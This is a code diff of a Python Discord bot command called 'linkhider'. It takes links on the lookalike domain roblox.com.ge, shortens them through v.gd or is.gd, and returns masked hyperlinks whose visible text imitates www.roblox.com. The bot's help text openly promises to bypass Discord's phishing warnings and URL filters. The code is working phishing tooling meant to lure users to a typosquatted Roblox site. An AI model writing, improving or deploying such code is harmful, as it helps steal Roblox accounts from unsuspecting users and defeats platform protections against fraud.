@@ -26,22 +26,17 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
     )
     
     def format_display_url(self, original_url):
-        """Преобразует ссылку в формат https*://*www.roblox.com/путь"""
-        # Убираем домен roblox.com.ge, оставляем путь
         match = re.search(r'roblox\.com\.ge(.*)', original_url)
         if match:
             path = match.group(1)
         else:
             path = re.sub(r'^https?://[^/]+', '', original_url)
-        
-        # Формируем итоговую ссылку
         return f"https*://*www.roblox.com{path}"
     
     async def shorten_url(self, session, original_url):
-        """Сокращает ссылку через v.gd"""
         try:
             headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'User-Agent': 'Mozilla/5.0',
                 'Content-Type': 'application/x-www-form-urlencoded',
             }
             data = {'url': original_url, 'shorturl': '', 'Publish': 'Create'}
@@ -50,16 +45,13 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
                 match = re.search(r'https://v\.gd/[a-zA-Z0-9]+', text)
                 if match:
                     return match.group(0)
-        except Exception as e:
-            print(f"v.gd failed: {e}")
+        except:
+            pass
         
-        # Если v.gd не сработал, пробуем is.gd
         try:
             headers = {
                 'User-Agent': 'Mozilla/5.0',
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://is.gd',
-                'Referer': 'https://is.gd/',
             }
             data = {'url': original_url, 'shorturl': '', 'submit': 'Shorten!'}
             async with session.post('https://is.gd/create.php', data=data, headers=headers, timeout=15) as resp:
@@ -67,14 +59,13 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
                 match = re.search(r'https://is\.gd/[a-zA-Z0-9]+', text)
                 if match:
                     return match.group(0)
-        except Exception as e:
-            print(f"is.gd failed: {e}")
+        except:
+            pass
         
         return None
     
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True, thinking=True)
-        
         original_url = self.link.value.strip()
         if not original_url.startswith(('http://', 'https://')):
             original_url = 'https://' + original_url
@@ -84,16 +75,13 @@ class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
                 short_url = await self.shorten_url(session, original_url)
             
             if short_url:
-                # Форматируем отображаемую ссылку (без .ge)
                 display_url = self.format_display_url(original_url)
-                # Создаём сообщение в формате [ссылка_для_отображения](короткая_ссылка)
                 message = f"[{display_url}]({short_url})"
                 await interaction.user.send(message)
                 await interaction.followup.send("✅ Done! Check your DMs.", ephemeral=True)
             else:
                 await interaction.followup.send("❌ Failed to shorten link. Try again later.", ephemeral=True)
         except Exception as e:
-            print(f"Error: {e}")
             await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
 
 @bot.tree.command(name="linkhider", description="Hide your Roblox link (profile or private server)")
@@ -103,17 +91,20 @@ async def linkhider(interaction: discord.Interaction):
         description=(
             "**Hide your link and bypass Discord warnings & errors**\n\n"
             "**WHAT IS LINK HIDER?**\n"
-            "• A tool that converts your Roblox link into a safe format\n\n"
+            "• A tool that converts your link into a safe format that bypasses Discord's phishing warnings and URL blocks\n\n"
             "**WHY USE IT?**\n"
             "• No more warning pages\n"
             "• Bypass Discord URL filters\n"
-            "• Works with profile and private server links\n"
-            "• Clean redirects\n\n"
+            "• Clean redirects\n"
+            "• **100% working method**\n\n"
             "**HOW IT WORKS**\n"
             "1. Click 'CREATE HYPERLINK' below\n"
-            "2. Paste your Roblox link\n"
+            "2. Paste your link in the window\n"
             "3. Get your hidden link in DMs\n"
-            "4. Share safely anywhere"
+            "4. Share safely anywhere\n\n"
+            "**SUPPORTED LINKS**\n"
+            "• Profile: `https://roblox.com.ge/users/123456/profile`\n"
+            "• Private Server: `https://roblox.com.ge/games/123456/Game?privateServerLinkCode=xxx`"
         ),
         color=discord.Color.blue()
     )
